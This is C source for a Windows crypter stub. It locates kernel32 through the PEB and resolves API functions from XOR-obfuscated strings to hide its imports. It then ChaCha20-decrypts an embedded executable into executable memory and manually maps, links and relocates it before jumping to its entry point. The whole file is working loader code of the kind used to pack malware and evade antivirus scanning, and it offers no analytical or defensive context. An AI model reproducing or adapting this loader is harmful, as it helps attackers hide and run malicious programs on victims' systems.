#include "stub.h"

// declare key, exe ptr, and size in .data section to be initialized by cryptor
uint8_t key[KEY_SIZE] = { 0xFF };
void* encrypted_exe = &key; // dereference ptr for reloc entry
uint32_t size = 1;

char xorKey[] = { 0x2f, 0x84, 0x18, 0x8e, 0x13, 0xaa, 0x49, 0xed, 0xa7, 0x57, 0xda, 0x2b, 0xf4, 0x61, 0x8b };
char strGetProcAddress[] = { 0x68, 0xe1, 0x6c, 0xde, 0x61, 0xc5, 0x2a, 0xac, 0xc3, 0x33, 0xa8, 0x4e, 0x87, 0x12, 0x8b };
char strVirtualAlloc[] = { 0x79, 0xed, 0x6a, 0xfa, 0x66, 0xcb, 0x25, 0xac, 0xcb, 0x3b, 0xb5, 0x48, 0xf4 };
char strLoadLibraryA[] = { 0x63, 0xeb, 0x79, 0xea, 0x5f, 0xc3, 0x2b, 0x9f, 0xc6, 0x25, 0xa3, 0x6a, 0xf4 };
char strExitProcess[] = { 0x6a, 0xfc, 0x71, 0xfa, 0x43, 0xd8, 0x26, 0x8e, 0xc2, 0x24, 0xa9, 0x2b };
void* (*xGetProcAddress)(void*, uint8_t*) = NULL;
void* (*xVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = NULL;
void* (*xLoadLibraryA)(uint8_t*) = NULL;

PIMAGE_OPTIONAL_HEADER opHeader;
PIMAGE_SECTION_HEADER section;

uint8_t* findKernel32Base()
{
	PPEB peb = *(PPEB*)(_readgsbase_u64() + 0x60);
	PPEB_LDR_DATA ldr = peb->Ldr;
	PLIST_ENTRY thisImage = ldr->InMemoryOrderModuleList.Flink;
	PLIST_ENTRY ntdll = thisImage->Flink;
	uint8_t* kernel32 = (uint8_t*)ntdll->Flink;
	return *(void**)(kernel32 + (sizeof(PVOID) * 4));
}

void decryptStrings()
{
	for (int i = 0; i < sizeof(strGetProcAddress); i++)
	{
		strGetProcAddress[i] ^= xorKey[i];
	}
	for (int i = 0; i < sizeof(strVirtualAlloc); i++)
	{
		strVirtualAlloc[i] ^= xorKey[i];
	}
	for (int i = 0; i < sizeof(strLoadLibraryA); i++)
	{
		strLoadLibraryA[i] ^= xorKey[i];
	}
}

BOOL findGetProcAddress(uint8_t* base)
{
	IMAGE_DATA_DIRECTORY etable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY exports = (void*)(base + etable.VirtualAddress);
	uint32_t* exportFunc = (void*)(base + exports->AddressOfFunctions);
	uint32_t* exportName = (void*)(base + exports->AddressOfNames);
	uint16_t* exportOrdinal = (void*)(base + exports->AddressOfNameOrdinals);

	for (uint16_t i = 0; i < exports->NumberOfNames; i++)
	{
		uint8_t* name = base + exportName[i];
		BOOL equal = TRUE;

		// strcmp
		for (int j = 0; strGetProcAddress[j] != '\0'; j++)
		{
			if (name[j] == '\0')
			{
				equal = FALSE;
				break;
			}
			if (name[j] != strGetProcAddress[j])
				equal = FALSE;
		}

		if (equal)
		{
			uint32_t rva = exportFunc[exportOrdinal[i]];

			xGetProcAddress = (void*)(base + rva);
			return TRUE;
		}
	}

	return FALSE;
}

uint32_t calcVAsize()
{
	uint32_t size = 0;

	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		if (section->VirtualAddress > size)
		{
			size = section->VirtualAddress + section->SizeOfRawData;
		}
		section++;
	}

	return size;
}

void loadSections(uint8_t* vAddr, uint8_t* exe)
{
	for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		// memcpy
		for (DWORD j = 0; j < section->SizeOfRawData; j++)
		{
			(vAddr + section->VirtualAddress)[j] = ((uint8_t*)exe + section->PointerToRawData)[j];
		}

		section++;
	}
}

int loadImports(uint8_t* vAddr, uint8_t* exe)
{
	IMAGE_DATA_DIRECTORY itable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	DWORD itableOffset = offset(itable.VirtualAddress, section);
	if (itable.Size)
	{
		for (PIMAGE_IMPORT_DESCRIPTOR i = (void*)((uint8_t*)exe + itableOffset); i->Name; i++)
		{
			HMODULE module = xLoadLibraryA((uint8_t*)exe + offset(i->Name, section));
			if (!module) return -1;

			// 64 bit
			int k = 0;
			for (uint64_t* j = (void*)((uint8_t*)exe + offset(i->Characteristics, section)); *j; j++, k++)
			{
				void* importFunc;

				if (*j & 0x8000000000000000) // if importing by ordinal
				{
					importFunc = xGetProcAddress(module, (uint8_t*)(*j & 0xFFFF));
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME hint = (void*)((uint8_t*)exe + offset(*j & 0xFFFFFFFF, section));

					importFunc = xGetProcAddress(module, (uint8_t*)&hint->Name);
				}

				((uint64_t*)(vAddr + i->FirstThunk))[k] = (uint64_t)importFunc;
			}
		}
	}

	return 0;
}

void fixRelocations(uint8_t* vAddr, uint8_t* exe)
{
	int64_t aslrOffset = (uint64_t)vAddr - opHeader->ImageBase;

	IMAGE_DATA_DIRECTORY rtable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD rtableOffset = offset(rtable.VirtualAddress, section);
	PIMAGE_BASE_RELOCATION rtableEnd = (void*)((uint8_t*)exe + rtableOffset + rtable.Size);
	if (rtable.Size)
	{
		for (PIMAGE_BASE_RELOCATION i = (void*)((uint8_t*)exe + rtableOffset);
			i < rtableEnd;
			(uint8_t*)i += i->SizeOfBlock)
		{
			uint16_t* reloc = (void*)((uint8_t*)i + sizeof(IMAGE_BASE_RELOCATION));

			for (uint16_t* j = reloc; j < (uint16_t*)((uint8_t*)i + i->SizeOfBlock); j++)
			{
				DWORD relocOffset = i->VirtualAddress + (*j & 0xFFF);

				if (*j >> 12 == IMAGE_REL_BASED_DIR64)
				{
					*(uint64_t*)(vAddr + relocOffset) += aslrOffset;
				}
			}
		}
	}
}

#ifndef STUB_DLL
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
#else
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
#endif
{
	// find vAddr of kernel32.dll
	uint8_t* kernel32Base = findKernel32Base();
	
	// decrypt function name strings
	decryptStrings();

	// find GetProcAddress
	ntHeader = (PIMAGE_NT_HEADERS)(kernel32Base + ((IMAGE_DOS_HEADER*)kernel32Base)->e_lfanew);
	opHeader = &ntHeader->OptionalHeader;

	if (!findGetProcAddress(kernel32Base))
		return -1;

	// resolve other functions
	xVirtualAlloc = xGetProcAddress(kernel32Base, strVirtualAlloc);
	xLoadLibraryA = xGetProcAddress(kernel32Base, strLoadLibraryA);

	if (size < 2) return -1; // stub doesn't execute alone

	// allocate memory for unencrypted program
	void* decrypted_exe = xVirtualAlloc(
		NULL,
		size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!decrypted_exe) return -1;
	
	// decrypt executable
	chacha20_ctx ctx;
	chacha20_setup(&ctx, key, KEY_SIZE, key); // confidentiality is not a priority
	chacha20_decrypt(&ctx, encrypted_exe, decrypted_exe, size);

	// manually load executable into memory
	ntHeader = (PIMAGE_NT_HEADERS)((uint8_t*)decrypted_exe + ((IMAGE_DOS_HEADER*)decrypted_exe)->e_lfanew);
	section = IMAGE_FIRST_SECTION(ntHeader);
	opHeader = &ntHeader->OptionalHeader;

	// allocate memory for executable to be loaded
	uint32_t vaSize = calcVAsize();
	uint8_t* program = xVirtualAlloc(
		NULL,
		vaSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!program) return -1;

	// load sections
	section = IMAGE_FIRST_SECTION(ntHeader);
	loadSections(program, decrypted_exe);

	// dynamically load imports
	section = IMAGE_FIRST_SECTION(ntHeader);
	if (loadImports(program, decrypted_exe))
		return -1;
	
	// fix relocations
	fixRelocations(program, decrypted_exe);

	// execute decrypted program
	int (*entry)() = (void*)(program + opHeader->AddressOfEntryPoint);

#ifndef STUB_DLL
	return entry();
#else
	return entry(hinstDLL, fdwReason, lpReserved);
#endif
}